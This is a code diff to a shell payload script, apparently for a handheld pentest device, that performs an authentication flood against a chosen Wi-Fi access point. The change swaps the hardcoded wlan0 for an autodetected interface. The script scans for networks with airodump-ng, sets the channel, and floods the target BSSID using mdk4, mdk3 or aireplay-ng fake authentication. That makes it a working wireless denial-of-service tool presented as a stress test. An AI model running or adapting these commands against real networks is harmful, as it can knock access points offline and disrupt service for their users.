@@ -4,6 +4,11 @@
 # Description: Authentication flood to stress test APs
 # Category: nullsec/attack
 
+# Autodetect the right wireless interface (exports $IFACE).
+# Falls back to showing the pager error dialog if nothing is plugged in.
+. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
+nullsec_require_iface || exit 1
+
 PROMPT "AUTH FLOOD
 
 Flood target AP with
@@ -16,8 +21,6 @@ Can cause AP to:
 
 Press OK to configure."
 
-[ ! -d "/sys/class/net/wlan0" ] && { ERROR_DIALOG "wlan0 not found!"; exit 1; }
-
 PROMPT "SELECT TARGET:
 
 1. Scan and select
@@ -29,7 +32,7 @@ MODE=$(NUMBER_PICKER "Mode (1-2):" 1)
 
 if [ "$MODE" -eq 1 ]; then
     SPINNER_START "Scanning..."
-    timeout 10 airodump-ng wlan0 --write-interval 1 -w /tmp/authscan --output-format csv 2>/dev/null
+    timeout 10 airodump-ng $IFACE --write-interval 1 -w /tmp/authscan --output-format csv 2>/dev/null
     SPINNER_STOP
     
     NET_COUNT=$(grep -c "WPA\|WEP\|OPN" /tmp/authscan*.csv 2>/dev/null || echo 0)
@@ -59,17 +62,17 @@ Duration: ${DURATION}s
 Press OK to attack.")
 [ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0
 
-iwconfig wlan0 channel $CHANNEL
+iwconfig $IFACE channel $CHANNEL
 
 LOG "Flooding $SSID..."
 
 if command -v mdk4 >/dev/null 2>&1; then
-    timeout $DURATION mdk4 wlan0 a -a "$BSSID" &
+    timeout $DURATION mdk4 $IFACE a -a "$BSSID" &
 elif command -v mdk3 >/dev/null 2>&1; then
-    timeout $DURATION mdk3 wlan0 a -a "$BSSID" &
+    timeout $DURATION mdk3 $IFACE a -a "$BSSID" &
 else
     # Fallback to fake auth
-    timeout $DURATION aireplay-ng -1 0 -e "$SSID" -a "$BSSID" -h $(cat /sys/class/net/wlan0/address) wlan0 &
+    timeout $DURATION aireplay-ng -1 0 -e "$SSID" -a "$BSSID" -h $(cat /sys/class/net/$IFACE/address) $IFACE &
 fi
 
 FLOOD_PID=$!
